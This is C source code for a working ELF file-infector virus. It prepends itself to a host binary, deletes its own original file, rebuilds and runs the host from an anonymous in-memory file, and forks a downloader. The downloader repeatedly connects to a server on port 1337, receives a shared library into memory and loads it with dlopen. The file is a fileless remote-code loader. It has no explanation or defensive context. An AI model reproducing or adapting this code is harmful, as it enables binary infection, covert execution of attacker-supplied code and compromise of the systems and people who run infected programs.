#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/unistd.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define always_inline __attribute__((always_inline))
#define optimize(x) __attribute__((optimize(x)))

#define memfd_create(x,y) syscall(__NR_memfd_create, x, y)

#define opt 3

#define infection_target "./test"

#define port 1337
#define addr "127.0.0.1"

extern char** environ;

always_inline optimize(opt) static inline long elf_size(FILE*);
always_inline optimize(opt) static inline int is_elf(char*);
always_inline optimize(opt) static inline int is_infected(char*);
always_inline optimize(opt) static inline void infect(FILE*, FILE*);
always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
always_inline optimize(opt) static inline void load_so(int, int);
always_inline optimize(opt) static inline void process_connection(int);
always_inline optimize(opt) static inline void downloader();

int main(int argc, char** argv){
  if(!is_infected(infection_target)){
    FILE* host=fopen(infection_target, "rb+");
    FILE* parasite=fopen(argv[0], "rb");
    infect(host, parasite);
    fclose(host);
    fclose(parasite);
  }else{
    FILE* infected=fopen(argv[0], "rb");
    execute_host(infected, argv, environ);
  }
}

long elf_size(FILE* f){
  Elf64_Ehdr header;
  fread(&header, 1, sizeof(Elf64_Ehdr), f);
  fseek(f, 0, SEEK_SET);
  return header.e_shoff+(header.e_shentsize*header.e_shnum);
}

int is_infected(char* f){
  FILE* file = fopen(f, "rb");
  if(file){
    long e_size = elf_size(file);
    fseek(file, 0, SEEK_END);
    long f_size = ftell(file);
    fclose(file);
    if(f_size-e_size != 0){
      return 1;
    }
  }
  return 0;
}

void infect(FILE* h, FILE* p){
  long h_size = elf_size(h);
  long p_size = elf_size(p);
  char h_buffer[h_size];
  char p_buffer[p_size];
  char file_link[0xF];
  char file_name[0xF];
  fread(h_buffer, sizeof(char), h_size, h);
  fread(p_buffer, sizeof(char), p_size, p);
  for(int i = 0; i < 4; ++i){
    *(h_buffer + i) = 0;
  }
  fseek(h, 0, SEEK_SET);
  fwrite(p_buffer, sizeof(char), p_size, h);
  fwrite(h_buffer, sizeof(char), h_size, h);
  sprintf(file_link, "/proc/self/fd/%d", fileno(p));
  readlink(file_link, file_name, 0x7F);
  remove(file_name);
}

void execute_host(FILE* f, char** argv, char** envp){
  long p_size = elf_size(f);
  fseek(f, p_size, SEEK_SET);
  long h_size = elf_size(f);
  char host[h_size];
  fseek(f, p_size, SEEK_SET);
  fread(host, sizeof(char), h_size, f);
  host[0] = ELFMAG0;
  host[1] = ELFMAG1;
  host[2] = ELFMAG2;
  host[3] = ELFMAG3;
  int fd = memfd_create("", 1);
  write(fd, host, h_size);
  pid_t pid;
  if((pid = fork()) == 0){
    downloader();
  }
  if((pid = fork()) == 0){
    fexecve(fd, argv, envp);
  }else{
    wait(NULL);
  }
}

void load_so(int socket_fd, int size){
  char* file_buff = (char*)malloc(sizeof(char)*size);
  int fd = memfd_create("", 1);
  read(socket_fd, file_buff, sizeof(char)*size);
  write(fd, file_buff, size);
  free(file_buff);
  void* handle;
  char file_path[20];
  sprintf(file_path, "/proc/self/fd/%d", fd);
  handle = dlopen(file_path, RTLD_LAZY);
  dlclose(handle);
  exit(0);
}

void process_connection(int socket_fd){
  char buff[13];
  read(socket_fd, buff, sizeof(buff));
  int size = atoi(buff);
  load_so(socket_fd, size);
}

void downloader(){
  int socket_fd;
  int connection = -1;
  pid_t pid;
  struct sockaddr_in server;
  
  socket_fd = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(port);
  server.sin_addr.s_addr = inet_addr(addr);

  while(connection < 0){
    sleep(5);
    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
  }

  if((pid = fork()) == 0){
    process_connection(socket_fd);
  }else{
    wait(NULL);
  }
  
  close(socket_fd);
}
